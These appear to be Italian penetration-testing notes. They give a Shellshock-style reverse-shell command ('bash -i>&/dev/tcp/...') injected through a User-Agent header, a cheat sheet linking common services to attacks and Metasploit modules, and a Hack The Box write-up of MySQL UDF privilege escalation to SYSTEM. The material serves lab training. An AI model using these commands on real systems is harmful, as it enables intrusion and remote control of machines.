# Utili

## Per ottenere una reverse shell

Apriamo una porta con il listener netcat:

<figure><img src=".gitbook/assets/image (248).png" alt=""><figcaption></figcaption></figure>

Apriamo poi Burp Suite e cambiamo il comando specificato nell'user agent con: **'bash -i>&/dev/tcp/KALI LINUX IP/PORT 0>&1'**

<figure><img src=".gitbook/assets/image (909).png" alt=""><figcaption></figcaption></figure>

## CheatSheet enumeration ed exploitation dei vari servizi più comuni

<table data-header-hidden><thead><tr><th width="108.800048828125"></th><th width="84.800048828125"></th><th width="185.7999267578125"></th><th></th><th width="197.4000244140625"></th></tr></thead><tbody><tr><td><strong>Servizio</strong></td><td><strong>Porta</strong></td><td><strong>Tool Principali</strong></td><td><strong>Vettore / Vulnerabilità</strong></td><td><strong>Modulo MSF</strong></td></tr><tr><td>FTP</td><td>21</td><td><code>nmap</code>, <code>ftp</code></td><td>Anonymous login, exploit versioni vecchie.</td><td><code>vsftpd_234_backdoor</code></td></tr><tr><td>SSH</td><td>22</td><td><code>hydra</code>, <code>ssh</code></td><td>Brute force o Login senza password.</td><td><code>ssh_login</code> (aux)</td></tr><tr><td>SMTP</td><td>25</td><td><code>smtp-user-enum</code></td><td>Enumerazione utenti via <code>VRFY</code>.</td><td><code>smtp_enum</code> (aux)</td></tr><tr><td>DNS</td><td>53</td><td><code>dig</code>, <code>dnsrecon</code></td><td>Zone Transfer (AXFR).</td><td><code>enum_dns</code> (aux)</td></tr><tr><td>HTTP(S)</td><td>80/443</td><td><code>gobuster</code>, <code>nikto</code></td><td>Directory busting, LFI/RFI, SQLi.</td><td><code>http_version</code> (aux)</td></tr><tr><td>WordPress</td><td>80/443</td><td><code>nmap --script=http-wordpress-*</code>, <code>wpscan</code></td><td>Enumerazione Plugin, temi e utenti.</td><td><code>auxiliary/scanner/http/wp_...</code></td></tr><tr><td>Shellshock</td><td>80/443</td><td><code>curl</code>, <code>nmap</code></td><td>RCE via <code>/cgi-bin/</code> e header User-Agent.</td><td><code>apache_mod_cgi_bash_env_exec</code></td></tr><tr><td>SMB</td><td>445</td><td><code>enum4linux</code>, <code>smbmap</code></td><td>Null sessions, share aperte, EternalBlue.</td><td><code>ms17_010_eternalblue</code></td></tr><tr><td>SNMP</td><td>161</td><td><code>snmp-check</code></td><td>Lettura processi/utenti (stringa <em>public</em>).</td><td><code>snmp_enum</code> (aux)</td></tr><tr><td>MSSQL</td><td>1433</td><td><code>mssql-cli</code></td><td>Brute force <code>sa</code>, <code>xp_cmdshell</code>.</td><td><code>mssql_payload</code></td></tr><tr><td>NFS</td><td>2049</td><td><code>showmount -e</code></td><td>Montaggio share per lettura/scrittura file.</td><td><code>auxiliary/scanner/nfs/nfsmount</code></td></tr><tr><td>MySQL</td><td>3306</td><td><code>mysql</code></td><td>Accesso root vuoto, dump database.</td><td><code>mysql_login</code> (aux)</td></tr><tr><td>RDP</td><td>3389</td><td><code>nmap</code></td><td>Brute force, BlueKeep.</td><td><code>cve_2019_0708_bluekeep</code></td></tr></tbody></table>

***

***

***

privilege escalation eseguita sulla box Touch di HTB:

#### Step-by-Step Privilege Escalation (MySQL UDF to SYSTEM)

**1. Individuazione delle Credenziali**

* Ricerca iniziale: La password di root di MySQL era hardcodata o salvata all'interno dei file di configurazione dell'applicazione (spesso nei file sorgente o di configurazione Node.js del backend del chiosco, ad esempio `HTB@irw4ys_DB!2026`).

**2. Verifica dei Privilegi sul Database**

*   Connessione al database MySQL utilizzando le credenziali recuperate:

    DOS

    ```
    mysql -u root -p"HTB@irw4ys_DB!2026"
    ```
*   Verifica della posizione della cartella dei plugin di MySQL tramite l'interrogazione delle variabili di sistema:

    SQL

    ```
    SHOW VARIABLES LIKE 'plugin_dir';
    ```

    _(La cartella restituita indica dove MySQL cerca i file binari/plugin eseguibili)._

**3. Controllo dei Permessi sul File System (Windows)**

*   Controllo dei permessi sulla cartella dei plugin tramite il comando `icacls` di Windows:

    DOS

    ```
    icacls "C:\MySQL\lib\plugin"
    ```
* _Obiettivo:_ Verificare che l'utente corrente avesse i permessi di scrittura (`(WD)` o scrittura esplicita) su quella specifica directory.

**4. Caricamento della Custom DLL (UDF)**

* Sfruttando i permessi di scrittura sulla cartella dei plugin, è stata inserita una DLL personalizzata (es. `lib_mysqludf_sys_64.dll`).
* Questa libreria espone funzioni personalizzate per eseguire comandi di sistema direttamente dal database, tra cui `sys_eval()`.

**5. Esecuzione dei Comandi come SYSTEM**

* Poiché il servizio MySQL su Windows gira nativamente con i privilegi massimi di `NT AUTHORITY\SYSTEM`, ogni comando eseguito tramite la UDF bypassa i normali limiti dell'utente con cui si è effettuato l'accesso iniziale.
*   Esecuzione del comando per leggere la root flag (facendo attenzione all'escaping dei backslash nel percorso):

    DOS

    ```
    mysql -u root -p"HTB@irw4ys_DB!2026" -e "SELECT sys_eval('type C:\\Users\\Administrator\\Desktop\\root.txt');"
    ```
